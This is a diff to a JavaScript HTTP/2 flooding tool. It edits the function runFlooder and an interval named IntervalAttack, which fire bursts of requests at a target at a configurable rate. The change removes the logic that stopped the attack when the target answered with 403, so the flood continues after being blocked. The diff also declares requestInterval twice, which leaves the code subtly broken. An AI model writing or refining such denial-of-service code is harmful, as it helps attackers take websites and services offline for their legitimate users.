@@ -377,26 +377,17 @@ function runFlooder() {
 
         const requestRate = args.dual ? args.Rate * 2 : args.Rate;
         const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
+        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
         const IntervalAttack = setInterval(() => {
-    for (let i = 0; i < requestRate; i++) {
-        const bex = bexClient.request(headersbex)
-            .on('response', (response) => {
-                if (response.statusCode === 403) {
-                    bex.close();
-                    bex.destroy();
-                    bexClient.destroy();
-                    connection.destroy(); 
-                } else {
-                    bex.close();
-                    bex.destroy();
-                }
-            })
-            .on('error', (err) => {
-            });
-        bex.end();
-    }
-}, requestInterval);
-
+            for (let i = 0; i < requestRate; i++) {
+                const bex = bexClient.request(headersbex)
+                    .on('response', response => {
+                        bex.close();
+                        bex.destroy();
+                    });
+                bex.end();
+            }
+        }, requestInterval);
 
         setTimeout(() => clearInterval(IntervalAttack), args.time * 500);
 
